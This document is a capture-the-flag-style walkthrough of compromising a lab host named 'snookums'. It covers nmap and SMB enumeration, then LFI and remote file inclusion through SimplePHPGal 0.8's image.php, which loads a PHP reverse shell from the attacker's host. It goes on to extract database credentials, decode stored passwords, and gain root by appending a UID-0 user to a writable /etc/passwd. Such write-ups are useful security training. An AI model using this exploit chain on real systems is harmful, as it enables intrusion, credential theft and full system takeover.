IP: 192.168.213.58

---

## Nmap

```
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2  (anonymous login allowed — hangs on ls)
22/tcp    open  ssh         OpenSSH 7.4
80/tcp    open  http        Apache/2.4.6 (CentOS) PHP/5.4.16
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn Samba 4.10.4
445/tcp   open  netbios-ssn Samba 4.10.4
3306/tcp  open  mysql       MySQL (unauthorized — remote connections blocked)
33060/tcp open  mysqlx
```

---

## Enumeration

**FTP** — anonymous login works but every command hangs (passive mode issue). Dead end.

**SMB** — anonymous login works. enum4linux reveals one local user via RID cycling:

```bash
enum4linux -a 192.168.213.58
# → S-1-22-1-1000 Unix User\michael
```

`print$` access denied. `IPC$` accessible but not browsable. No useful shares.

**Web** — page footer reads `Simple PHP Photo Gallery v0.8`. Gobuster with extensions finds key files:

```bash
gobuster dir -u http://192.168.213.58 -w /usr/share/dirb/wordlists/common.txt -x php,txt,bak
# → image.php (LFI/RFI vector)
# → db.php    (database credentials — returns empty body because PHP executes it silently)
# → functions.php
# → README.txt / license.txt
```

---

## Initial Access — RFI via image.php

SimplePHPGal 0.8 is vulnerable to Remote File Inclusion. The `image.php` script passes the `img` parameter directly into `include()` with no validation, accepting both local paths and remote URLs.

**LFI confirmed first** — reading `/etc/passwd` via Burp Repeater:

```
GET /image.php?img=../../../../../etc/passwd HTTP/1.1
```

**PHP filter to read db.php source** (direct include executes PHP silently — use filter to get raw source):

```
GET /image.php?img=php://filter/convert.base64-encode/resource=db.php HTTP/1.1
```

Decode the base64 blob on Kali:

```bash
echo "<blob>" | base64 -d
# → DBUSER: root / DBPASS: MalapropDoffUtilize1337 / DBNAME: SimplePHPGal
```

**RFI for shell** — host the PHP reverse shell on Kali, then call it via RFI:

```bash
# Edit /usr/share/webshells/php/php-reverse-shell.php
# Set $ip = '192.168.45.240' and $port = 445

# Host it
python3 -m http.server 80

# Start listener
nc -lvnp 445
```

Browse to (or use curl):
```
http://192.168.213.58/image.php?img=http://192.168.45.240/php-reverse-shell.php
```

Shell lands as `apache`. Stabilize:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Note: `python3` is not installed — use `python` (Python 2).

---

## Lateral Movement — MySQL → michael

Connect to MySQL locally using credentials from db.php:

```bash
mysql -u root -p'MalapropDoffUtilize1337' SimplePHPGal
```

```sql
show tables;
select * from users;
```

```
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==     |
+----------+----------------------------------------------+
```

Passwords are double base64 encoded. Decode michael's on Kali:

```bash
echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d | base64 -d
# → HockSydneyCertify123
```

SSH in:

```bash
ssh michael@192.168.213.58
# password: HockSydneyCertify123
```

---

## Privilege Escalation — Writable /etc/passwd

```bash
ls -la /etc/passwd
# -rw-r--r--. 1 michael root 1162 ...
```

`/etc/passwd` is owned by `michael` — he can write to it directly.

```bash
# On Kali — generate password hash
openssl passwd -1 -salt hack password123
# → $1$hack$MLgkAESrYp7kzYz0Ex2fV/

# On target — append new root user
echo 'hacker:$1$hack$MLgkAESrYp7kzYz0Ex2fV/:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# password: password123
```

UID/GID 0 = root regardless of username.

```
[root@snookums ~]# id
uid=0(root) gid=0(root) groups=0(root)
```
